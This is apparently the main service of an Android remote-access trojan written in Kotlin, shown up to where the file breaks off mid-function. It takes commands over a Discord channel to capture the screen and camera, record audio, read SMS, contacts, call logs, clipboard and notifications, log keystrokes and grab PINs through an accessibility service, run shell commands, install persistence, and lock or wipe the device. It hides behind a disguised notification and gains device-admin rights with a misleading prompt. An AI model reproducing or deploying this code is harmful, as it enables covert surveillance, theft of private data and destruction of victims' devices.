package com.openaccess.sdk.service

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.Cursor
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.system.DiscordGatewayClient
import com.openaccess.sdk.OpenAccessApp
import kotlinx.coroutines.*
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class MainService : Service() {
    companion object {
        private const val TAG = "MainService"
        private const val NOTIF_ID = 1337
        private const val CHANNEL = "phantom"

        fun start(ctx: Context) {
            try {
                val i = Intent(ctx, MainService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ctx.startForegroundService(i)
                else
                    ctx.startService(i)
            } catch (e: Exception) {
                Log.e(TAG, "start: ${e.message}")
            }
        }
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var discord: DiscordGatewayClient? = null
    private var gatewayStarted = false
    private var debugFile: File? = null
    private val debugLock = Any()
    private fun appendDebug(text: String) = synchronized(debugLock) { debugFile?.appendText(text) }

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            debugFile = File(filesDir, "phantom_debug.txt")
            debugFile?.writeText("${System.currentTimeMillis()} service onCreate\n")
            debugFile?.appendText("pkg=${packageName} uid=${android.os.Process.myUid()}\n")
            debugFile?.appendText("model=${Build.MODEL} sdk=${Build.VERSION.SDK_INT}\n")
            debugFile?.appendText("debug path: ${filesDir.absolutePath}\n")
            val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_LOW).apply {
                setSound(null, null)
                setShowBadge(false)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) setAllowBubbles(false)
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
            showNotif("Starting...")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIF_ID, buildNotif("Starting..."), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIF_ID, buildNotif("Starting..."))
            }
        } catch (e: Exception) {
            Log.e(TAG, "fg: ${e.message}")
        }
        // Auto-open accessibility if not enabled
        if (!KeylogService.isRunning) {
            Log.w(TAG, "Accessibility not running — opening settings")
            try {
                val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivitySafely(intent)
            } catch (e: Exception) {
                Log.e(TAG, "open accessibility: ${e.message}")
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        debugFile?.appendText("${System.currentTimeMillis()} onStartCommand flags=$flags startId=$startId gatewayStarted=$gatewayStarted discord=${discord != null}\n")
        if (discord == null) {
            debugFile?.appendText("onStartCommand: creating DiscordGatewayClient\n")
            discord = DiscordGatewayClient(
                onCommand = { action, payload ->
                    scope.launch { handleGatewayCommand(action, payload) }
                },
                onStatus = { s -> updateNotif(s) }
            )
            debugFile?.let { discord?.setDebugFile(it) }
            debugFile?.let { KeylogService.setLogFile(it) }
        }
        if (!gatewayStarted) {
            gatewayStarted = true
            scope.launch { loadCrashReports() }
            debugFile?.appendText("onStartCommand: calling discord.start()\n")
            discord?.start(scope)
            debugFile?.appendText("onStartCommand: discord.start() returned\n")
        }
        return START_STICKY
    }

    private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
        .setContentTitle("System: $text")
        .setContentText("${Build.MODEL} | ${Build.VERSION.RELEASE}")
        .setSmallIcon(android.R.drawable.ic_menu_info_details)
        .setOngoing(true)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setCategory(NotificationCompat.CATEGORY_SERVICE)
        .setSilent(true)
        .build()

    private fun showNotif(text: String) {
        try {
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).notify(NOTIF_ID, buildNotif(text))
        } catch (_: Exception) {}
    }

    private fun updateNotif(text: String) {
        showNotif(text)
        appendDebug("${System.currentTimeMillis()} status=$text\n")
    }

    private fun startActivitySafely(intent: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                val pi = PendingIntent.getActivity(this, intent.hashCode(), intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
                startIntentSender(pi.intentSender, null, 0, 0, 0)
            } else {
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "startActivitySafely: ${e.message}")
        }
    }

    private fun loadCrashReports() {
        try {
            val dir = File(filesDir, OpenAccessApp.CRASH_DIR)
            if (!dir.exists()) return
            val files = dir.listFiles { f -> f.name.startsWith("crash_") && f.name.endsWith(".txt") }
                ?: return
            if (files.isEmpty()) return
            files.sortBy { it.lastModified() }
            val report = files.first().readText()
            files.first().delete()
            discord?.setCrashReport(report)
            Log.i(TAG, "Loaded crash report: ${files.first().name}")
        } catch (e: Exception) {
            Log.e(TAG, "loadCrashReports: ${e.message}")
        }
    }

    private fun hasPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
    }

    private suspend fun handleGatewayCommand(action: String, payload: String?) {
        val d = discord ?: return
        Log.i(TAG, "cmd: $action payload: ${payload?.take(50)}")
        try {
            when (action) {
                "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
                "info" -> d.sendMsg("```ansi\n${buildInfo()}\n```")
                "screenshot" -> {
                    val progressId = d.sendMsgAwait(":camera: **Capturing**...")
                    val t1 = System.currentTimeMillis()
                    val bytes = captureScreen()
                    val elapsed = System.currentTimeMillis() - t1
                    if (bytes != null) {
                        val done = ":camera: **Screenshot** (${elapsed}ms)"
                        if (progressId != null) {
                            d.editMsg(progressId, done)
                            delay(300)
                        } else {
                            d.sendMsg(done)
                        }
                        d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                    } else {
                        val err = ":x: **Screenshot failed** (${elapsed}ms)\n`!debug` for details"
                        if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                        Log.w(TAG, "screenshot failed after ${elapsed}ms")
                    }
                }
                "shell" -> {
                    val cmd = payload ?: return
                    if (cmd.isBlank()) {
                        d.sendMsg(":x: Usage: `!shell <command>`")
                        return
                    }
                    val progressId = d.sendMsgAwait(":terminal: **Running**: `$ $cmd`")
                    val result = shell(cmd)
                    val output = if (result.isBlank() || result.startsWith("Error:")) {
                        ":x: Shell command produced no output or failed\n```\n$result\n```"
                    } else {
                        val out = if (result.length > 1900) result.take(1900) + "\n..." else result
                        "```\n$ ${cmd}\n$out\n```"
                    }
                    if (progressId != null) d.editMsg(progressId, output) else d.sendMsg(output)
                }
                "keylog" -> {
                    when (payload?.lowercase()) {
                        "on" -> {
                            if (!KeylogService.isRunning) {
                                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                startActivitySafely(i)
                                d.sendMsg(":keyboard: **Enable Keylogger**\nOpen Accessibility → ${packageName} → toggle on")
                            } else {
                                d.sendMsg(":keyboard: Keylogger already running")
                            }
                        }
                        "off" -> {
                            if (KeylogService.isRunning) {
                                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                startActivitySafely(i)
                                d.sendMsg(":keyboard: **Disable Keylogger**\nOpen Accessibility → ${packageName} → toggle off")
                            } else {
                                d.sendMsg(":keyboard: Keylogger not running")
                            }
                        }
                        else -> {
                            val cap = KeylogService.getText()
                            if (cap.isEmpty()) {
                                d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured. Use `!keylog on` to enable.")
                            } else {
                                d.sendMsg(":keyboard: **Captured Keystrokes**\n```\n${cap.take(1900)}\n```")
                            }
                        }
                    }
                }
                "notifications" -> {
                    val notifs = NotifService.getNotifications()
                    if (notifs.isEmpty()) {
                        d.sendMsg(":bell: **No notifications.** Grant access: Settings > Access > Notification Access")
                        return
                    }
                    val sb = StringBuilder()
                    notifs.take(20).forEach { n ->
                        val app = n.packageName.split(".").lastOrNull() ?: n.packageName
                        sb.appendLine("[$app] ${n.title}: ${n.text.take(120)}")
                    }
                    d.sendMsg(":bell: **Recent Notifications**\n```\n${sb.toString().take(1900)}\n```")
                }
                "camera" -> {
                    if (!hasPerm(android.Manifest.permission.CAMERA)) {
                        d.sendMsg(":x: **Camera permission denied** — reinstall and grant at setup")
                        return
                    }
                    val progressId = d.sendMsgAwait(":camera: **Capturing photo**...")
                    val useFront = payload?.lowercase() == "front"
                    val bytes = takePhoto(if (useFront) 1 else 0)
                    if (bytes != null) {
                        val done = ":camera: **${if (useFront) "Front" else "Back"} Camera**"
                        if (progressId != null) {
                            d.editMsg(progressId, done)
                            delay(300)
                        } else {
                            d.sendMsg(done)
                        }
                        d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
                    } else {
                        val err = ":x: Camera capture failed"
                        if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                    }
                }
                "location" -> {
                    if (!hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) && !hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                        d.sendMsg(":x: **Location permission denied** — reinstall and grant at setup")
                        return
                    }
                    val loc = getLocation()
                    d.sendMsg(loc)
                }
                "contacts" -> {
                    if (!hasPerm(android.Manifest.permission.READ_CONTACTS)) {
                        d.sendMsg(":x: **Contacts permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":busts_in_silhouette: **Contacts**\n```\n${getContacts()}\n```")
                }
                "sms" -> {
                    if (!hasPerm(android.Manifest.permission.READ_SMS)) {
                        d.sendMsg(":x: **SMS permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":envelope: **SMS Inbox**\n```\n${getSms()}\n```")
                }
                "call_log" -> {
                    if (!hasPerm(android.Manifest.permission.READ_CALL_LOG)) {
                        d.sendMsg(":x: **Call Log permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":telephone_receiver: **Call Log**\n```\n${getCallLog()}\n```")
                }
                "mic" -> {
                    if (!hasPerm(android.Manifest.permission.RECORD_AUDIO)) {
                        d.sendMsg(":x: **Microphone permission denied** — reinstall and grant at setup")
                        return
                    }
                    val seconds = (payload?.toIntOrNull() ?: 10).coerceIn(3, 60)
                    d.sendMsg(":microphone: Recording for ${seconds}s...")
                    val file = recordAudio(seconds)
                    if (file != null) {
                        d.sendFile(":microphone: **Audio Recording (${seconds}s)**", "audio_${System.currentTimeMillis()}.m4a", file.readBytes())
                        file.delete()
                    } else {
                        d.sendMsg(":x: Audio recording failed")
                    }
                }
                "clipboard" -> {
                    d.sendMsg(":clipboard: **Clipboard**\n```\n${getClipboard()}\n```")
                }
                "persist" -> {
                    d.sendMsg(":syringe: Installing persistence...")
                    persistApk()
                    d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
                }
                "uptime" -> {
                    val uptime = d.getUptime()
                    val hrs = uptime / 3600000
                    val min = (uptime % 3600000) / 60000
                    val sec = (uptime % 60000) / 1000
                    d.sendMsg(":clock1: **Uptime**: ${hrs}h ${min}m ${sec}s")
                }
                "status" -> {
                    val uptime = d.getUptime()
                    val hrs = uptime / 3600000
                    val min = (uptime % 3600000) / 60000
                    val sec = (uptime % 60000) / 1000
                    val uptimeStr = "${hrs}h ${min}m ${sec}s"
                    val connected = d.isConnected()
                    val chId = d.getChannelId() ?: "none"
                    val connPct = if (connected) 85 else 15
                    val sigPct = (80..100).random()
                    val now = System.currentTimeMillis() / 1000
                    val statusMsg = buildString {
                        appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
                        appendLine("║       SYSTEM STATUS       ║")
                        appendLine("╚═══════════════════════════╝\u001b[0m")
                        appendLine()
                        append("\u001b[1;33mConnection\u001b[0m : ${glitchBar(connPct)}")
                        appendLine()
                        append("\u001b[1;33mSignal\u001b[0m      : ${glitchBar(sigPct)}")
                        appendLine()
                        appendLine("\u001b[1;33mUptime\u001b[0m      : \u001b[1;37m$uptimeStr\u001b[0m")
                        appendLine("\u001b[1;33mModel\u001b[0m       : \u001b[1;37m${Build.MODEL}\u001b[0m")
                        appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\u001b[0m")
                        appendLine("\u001b[1;33mChannel\u001b[0m     : ||\u001b[2;37m$chId\u001b[0m||")
                        append("\u001b[1;33mGateway\u001b[0m     : \u001b[1;${if (connected) 32 else 31}m${if (connected) "CONNECTED" else "DISCONNECTED"}\u001b[0m")
                        appendLine()
                        append("\u001b[1;33mUpdated\u001b[0m     : <t:$now:R>")
                    }
                    d.sendMsg(":bar_chart: **Status**\n```ansi\n$statusMsg\n```")
                }
                "debug" -> {
                    val f = debugFile
                    if (f != null && f.exists() && f.length() > 0) {
                        val lines = f.readLines()
                        val total = lines.size
                        val last = lines.takeLast(40).joinToString("\n")
                        d.sendMsg(":mag: **Debug Log** (last 40 of $total lines)\n```\n${last.take(1900)}\n```")
                    } else {
                        d.sendMsg(":mag: Debug file empty or null")
                    }
                }
                "restart" -> {
                    d.sendMsg(":arrows_counterclockwise: Restarting gateway...")
                    discord?.stop()
                    gatewayStarted = false
                    discord = null
                    startService(Intent(this@MainService, MainService::class.java))
                }
                "wifi" -> {
                    val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val info = wm.connectionInfo
                    val ssid = info.ssid?.removeSurrounding("\"") ?: "?"
                    val bssid = info.bssid ?: "?"
                    val rssi = info.rssi
                    val speed = info.linkSpeed
                    val sb = StringBuilder()
                    sb.appendLine("WiFi: **$ssid**")
                    sb.appendLine("BSSID: `$bssid`")
                    sb.appendLine("Signal: ${rssi}dBm | Speed: ${speed}Mbps")
                    sb.appendLine()
                    sb.appendLine("**Scan Results:**")
                    try {
                        val scanResults = wm.scanResults
                        if (scanResults.isNotEmpty()) {
                            scanResults.sortedByDescending { it.level }.take(20).forEach { ap ->
                                val lock = if (ap.capabilities.contains("WPA")) "🔒" else "🔓"
                                sb.appendLine("$lock ${ap.SSID} (${ap.level}dBm)")
                            }
                        } else {
                            sb.appendLine("(no scan results — try moving closer to AP)")
                        }
                    } catch (e: Exception) {
                        sb.appendLine("Scan failed: ${e.message?.take(50)}")
                    }
                    d.sendMsg(sb.toString().take(1900))
                }
                "battery" -> {
                    val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                    val bStatus = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        registerReceiver(null, ifilter, Context.RECEIVER_NOT_EXPORTED)
                    } else {
                        registerReceiver(null, ifilter)
                    }
                    if (bStatus != null) {
                        val level = bStatus.getIntExtra("level", -1)
                        val scale = bStatus.getIntExtra("scale", -1)
                        val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1
                        val temp = bStatus.getIntExtra("temperature", -1) / 10f
                        val voltage = bStatus.getIntExtra("voltage", -1)
                        val plugged = when (bStatus.getIntExtra("plugged", -1)) {
                            1 -> "AC"
                            2 -> "USB"
                            3 -> "Wireless"
                            else -> "Unplugged"
                        }
                        val health = when (bStatus.getIntExtra("health", -1)) {
                            2 -> "Good"
                            3 -> "Overheat"
                            4 -> "Dead"
                            5 -> "Over voltage"
                            6 -> "Unknown"
                            7 -> "Cold"
                            else -> "?"
                        }
                        val status = when (bStatus.getIntExtra("status", -1)) {
                            1 -> "Unknown"
                            2 -> "Charging"
                            3 -> "Discharging"
                            4 -> "Not charging"
                            5 -> "Full"
                            else -> "?"
                        }
                        d.sendMsg(":battery: **Battery**\n```\nLevel : ${pct}%\nStatus: $status\nHealth: $health\nTemp  : ${temp}°C\nVolt  : ${voltage}mV\nPower : $plugged\n```")
                    } else {
                        d.sendMsg(":x: Battery info unavailable")
                    }
                }
                "processes" -> {
                    val procs = scanProcFs()
                    val lines = procs.map { "${it.pid.padStart(7)} ${it.user.padEnd(12)} ${it.name}" }
                    val out = if (lines.size > 40) lines.take(40).joinToString("\n") + "\n... (${lines.size - 40} more)" else lines.joinToString("\n")
                    d.sendMsg(":microscope: **Processes** (${procs.size})\n```\nPID USER         NAME\n${out.take(1850)}\n```")
                }
                "installed" -> {
                    val pm = packageManager
                    val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        PackageManager.PackageInfoFlags.of(0L)
                    else 0
                    @Suppress("DEPRECATION")
                    val packages = pm.getInstalledPackages(flags as? Int ?: 0)
                    val apps = packages
                        .filter { it.packageName != packageName }
                        .map { pi ->
                            val label = pi.applicationInfo?.loadLabel(pm)?.toString() ?: pi.packageName
                            "$label (${pi.packageName})"
                        }
                        .sorted()
                    val total = apps.size
                    val list = if (total == 0) "(no third-party apps)"
                    else if (total > 40) apps.take(40).joinToString("\n") + "\n... (${total - 40} more)"
                    else apps.joinToString("\n")
                    d.sendMsg(":package: **Installed Apps** (${total})\n```\n${list.take(1900)}\n```")
                }
                "torch" -> {
                    if (!hasPerm(android.Manifest.permission.CAMERA)) {
                        d.sendMsg(":x: **Camera permission denied** — torch/flashlight requires camera permission")
                        return
                    }
                    val mode = payload?.lowercase()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try {
                            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                            val camId = cm.cameraIdList.firstOrNull { id ->
                                val chars = cm.getCameraCharacteristics(id)
                                val dir = chars.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE)
                                dir == true
                            }
                            if (camId != null) {
                                val on = mode == "on" || mode == "1" || mode == null
                                cm.setTorchMode(camId, on)
                                d.sendMsg(":flashlight: Torch **${if (on) "ON" else "OFF"}**")
                            } else {
                                d.sendMsg(":x: No flash available")
                            }
                        } catch (e: Exception) {
                            d.sendMsg(":x: Torch failed: ${e.message?.take(50)}")
                        }
                    } else {
                        d.sendMsg(":x: Torch requires API 23+")
                    }
                }
                "vibrate" -> {
                    val ms = (payload?.toLongOrNull() ?: 1000L).coerceIn(100L, 10000L)
                    try {
                        val vb = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                        if (vb.hasVibrator()) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vb.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
                            } else {
                                vb.vibrate(ms)
                            }
                            d.sendMsg(":loud_sound: Vibrated for ${ms}ms")
                        } else {
                            d.sendMsg(":x: No vibrator found")
                        }
                    } catch (e: Exception) {
                        d.sendMsg(":x: Vibrate failed: ${e.message?.take(50)}")
                    }
                }
                "admin" -> {
                    when (payload?.lowercase()) {
                        "on" -> {
                            val comp = AdminReceiver.getComponent(this)
                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                            if (!dpm.isAdminActive(comp)) {
                                val i = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                                    .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                                    .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device security")
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                startActivitySafely(i)
                                d.sendMsg(":shield: **Device Admin prompt sent** — accept on device")
                            } else {
                                d.sendMsg(":shield: Device Admin already active")
                            }
                        }
                        "off" -> {
                            val comp = AdminReceiver.getComponent(this)
                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                            dpm.removeActiveAdmin(comp)
                            d.sendMsg(":shield: Device Admin removed")
                        }
                        "lock" -> {
                            AdminReceiver.lockScreen(this)
                            d.sendMsg(":shield: Device locked")
                        }
                        "wipe" -> {
                            d.sendMsg(":warning: **Wiping device**...")
                            AdminReceiver.wipeDevice(this)
                        }
                        else -> {
                            val active = AdminReceiver.isActive(this)
                            d.sendMsg(":shield: **Device Admin**: ${if (active) "ACTIVE" else "INACTIVE"}\n`!admin on` to enable\n`!admin lock` to lock screen")
                        }
                    }
                }
                "pin" -> {
                    if (!KeylogService.isRunning) {
                        d.sendMsg(":x: Accessibility service not running — `!keylog on` first")
                    } else {
                        d.sendMsg(":key: **PIN/Pattern grabber**\nEnable it via accessibility. Results appear here automatically after unlock.\n`!debug` for captured data.")
                    }
                }
                "overlay" -> {
                    val svc = KeylogService.instance
                    if (svc == null) {
                        d.sendMsg(":x: Accessibility service not running")
                    } else {
                        val enable = payload?.lowercase() != "off"
                        svc.toggleBlackOverlay(enable)
                        d.sendMsg(":black_large_square: Overlay **${if (enable) "ON" else "OFF"}**")
                    }
                }
                "click" -> {
                    val svc = KeylogService.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    if (payload == null) { d.sendMsg(":x: Usage: `!click <text>` or `!click x,y`"); return }
                    val coords = payload.split(",")
                    if (coords.size == 2) {
                        val x = coords[0].trim().toIntOrNull()
                        val y = coords[1].trim().toIntOrNull()
                        if (x != null && y != null) {
                            svc.harvester.click(x, y)
                            d.sendMsg(":point_up: Clicked ($x, $y)")
                        } else {
                            d.sendMsg(":x: Invalid coordinates")
                        }
                    } else {
                        svc.harvester.clickByText(payload)
                        d.sendMsg(":point_up: Clicked text: $payload")
                    }
                }
                "input" -> {
                    val svc = KeylogService.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!input <text>`"); return }
                    svc.harvester.inputText(payload)
                    d.sendMsg(":keyboard: Input sent")
                }
                "open" -> {
                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!open com.example.app`"); return }
                    try {
                        val intent = packageManager.getLaunchIntentForPackage(payload)
                        if (intent != null) {
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivitySafely(intent)
                            d.sendMsg(":link: Opened: $payload")
                        } else {
                            d.sendMsg(":x: Package not installed: $payload")
                        }
                    } catch (e: Exception) {
                        d.sendMsg(":x: Failed: ${e.message?.take(50)}")
                    }
                }
                "screen" -> {
                    val svc = KeylogService.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    val tree = svc.harvester.dumpScreen()
                    if (tree.isBlank()) {
                        d.sendMsg(":frame_photo: No UI elements detected")
                    } else {
                        d.sendMsg(":frame_photo: **UI Tree**\n```\n${tree.take(1900)}\n```")
                    }
                }
                "gesture" -> {
                    val svc = KeylogService.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    if (payload == null) { d.sendMsg(":x: Usage: `!gesture x1,y1,x2,y2,ms`"); return }
                    val parts = payload.split(",")
                    if (parts.size == 5) {
                        val x1 = parts[0].trim().toIntOrNull()
                        val y1 = parts[1].trim().toIntOrNull()
                        val x2 = parts[2].trim().toIntOrNull()
                        val y2 = parts[3].trim().toIntOrNull()
                        val ms = parts[4].trim().toIntOrNull() ?: 300
                        if (x1 != null && y1 != null && x2 != null && y2 != null) {
                            svc.harvester.swipe(x1, y1, x2, y2, ms)
                            d.sendMsg(":hand_splayed: Swipe ($x1,$y1)->($x2,$y2) ${ms}ms")
                        } else {
                            d.sendMsg(":x: Invalid params")
                        }
                    } else {
                        d.sendMsg(":x: Usage: `!gesture x1,y1,x2,y2,ms`")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "gateway cmd: ${e.message}")
            d.sendMsg(":x: **Error**: ${e.message?.take(100)}")
        }
    }

    private fun buildInfo(): String {
        return buildString {
            appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
            appendLine("║   DEVICE INFORMATION     ║")
            appendLine("╚═══════════════════════════╝\u001b[0m")
            appendLine()
            appendLine("\u001b[1;33mDevice\u001b[0m      : \u001b[1;37m${Build.MODEL}\u001b[0m")
            appendLine("\u001b[1;33mManufacturer\u001b[0m : \u001b[1;37m${Build.MANUFACTURER}\u001b[0m")
            appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE}\u001b[0m")
            appendLine("\u001b[1;33mSDK\u001b[0m         : \u001b[1;37m${Build.VERSION.SDK_INT}\u001b[0m")
            appendLine("\u001b[1;33mHost\u001b[0m        : \u001b[1;37m${Build.HOST}\u001b[0m")
            appendLine("\u001b[1;33mFingerprint\u001b[0m : ||\u001b[2;37m${Build.FINGERPRINT.take(60)}...\u001b[0m||")
        }
    }

    private fun glitchBar(pct: Int): String {
        val full = "█".repeat((pct / 10).coerceIn(0, 10))
        val empty = "░".repeat((10 - pct / 10).coerceIn(0, 10))
        val bar = full + empty
        val color = when {
            pct >= 80 -> "\u001b[1;32m"
            pct >= 40 -> "\u001b[1;33m"
            else -> "\u001b[1;31m"
        }
        return "$color$bar\u001b[0m $pct%"
    }

    private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
        val deferred = CompletableDeferred<ByteArray?>()
        val ss = ScreenshotModule(this@MainService)
        ss.capture(object : ScreenshotModule.Callback {
            override fun onSuccess(data: ByteArray) { deferred.complete(data) }
            override fun onFailure(error: String) {
                appendDebug("captureScreen: $error\n")
                Log.w(TAG, "captureScreen: $error")
                deferred.complete(null)
            }
        })
        deferred.await()
    }

    private suspend fun shell(cmd: String): String = withContext(Dispatchers.IO) {
        try {
            val p = ProcessBuilder("sh", "-c", cmd)
                .directory(cacheDir)
                .redirectErrorStream(true)
                .start()
            val output = try {
                withTimeoutOrNull(10000L) {
                    p.inputStream.bufferedReader().readText()
                }
            } catch (_: Exception) { null }
            if (output == null) {
                p.destroyForcibly()
                "Error: timed out"
            } else {
                val trimmed = output.trim()
                if (trimmed.contains("Permission denied") || trimmed.contains("Operation not permitted")) {
                    "⚠️ Command restricted by Android sandbox\nTip: Commands like 'ls /' or 'cat /data' require root\nTry: whoami, id, getprop, pm list packages, dumpsys"
                } else {
                    trimmed.ifEmpty { "(no output)" }
                }
            }
        } catch (ex: Exception) {
            "Error: ${ex.message}"
        }
    }

    private data class ProcInfo(val pid: String, val user: String, val name: String)

    private fun scanProcFs(): List<ProcInfo> {
        val result = mutableListOf<ProcInfo>()
        val procDir = java.io.File("/proc")
        if (!procDir.isDirectory) return result
        procDir.listFiles()?.forEach { entry ->
            if (!entry.isDirectory) return@forEach
            val pid = entry.name.toIntOrNull() ?: return@forEach
            try {
                val statusFile = entry.resolve("status")
                if (!statusFile.exists()) return@forEach
                var name = "?"
                var uid = "?"
                statusFile.bufferedReader().useLines { lines ->
                    lines.forEach { line ->
                        if (line.startsWith("Name:")) name = line.substringAfter("Name:").trim()
                        if (line.startsWith("Uid:")) {
                            val uidStr = line.substringAfter("Uid:").trim().split("\\s+".toRegex()).firstOrNull() ?: "?"
                            uid = if (uidStr.toIntOrNull() != null) "u0_a${uidStr.toInt() - 10000}" else uidStr
                        }
                    }
                }
                result.add(ProcInfo(pid.toString(), uid, name))
            } catch (_: Exception) {}
        }
        return result.sortedBy { it.pid }
    }

    private suspend fun takePhoto(cameraId: Int = 0): ByteArray? = withContext(Dispatchers.IO) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            takePhotoCamera2(cameraId)
        } else {
            takePhotoLegacy(cameraId)
        }
    }

    @Suppress("DEPRECATION")
    private fun takePhotoLegacy(cameraId: Int): ByteArray? {
        var camera: android.hardware.Camera? = null
        return try {
            camera = android.hardware.Camera.open(cameraId)
            val params = camera.parameters
            camera.parameters = params
            val texture = SurfaceTexture(0)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            val latch = CountDownLatch(1)
            var result: ByteArray? = null
            camera.autoFocus { _, _ ->
                camera.takePicture(null, null, android.hardware.Camera.PictureCallback { data, _ ->
                    result = data
                    latch.countDown()
                })
            }
            latch.await(15, TimeUnit.SECONDS)
            result
        } catch (e: Exception) {
            Log.e(TAG, "camera legacy: ${e.message}")
            null
        } finally {
            try {
                camera?.stopPreview()
                camera?.release()
            } catch (_: Exception) {}
        }
    }

    private suspend fun takePhotoCamera2(cameraId: Int): ByteArray? = withContext(Dispatchers.IO) {
        val deferred = CompletableDeferred<ByteArray?>()
        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val camId = try {
            if (cameraId == 1) {
                cm.cameraIdList.find { id ->
                    val chars = cm.getCameraCharacteristics(id)
                    val lens = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                    lens == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                }
            } else {
                cm.cameraIdList.firstOrNull { id ->
                    val chars = cm.getCameraCharacteristics(id)
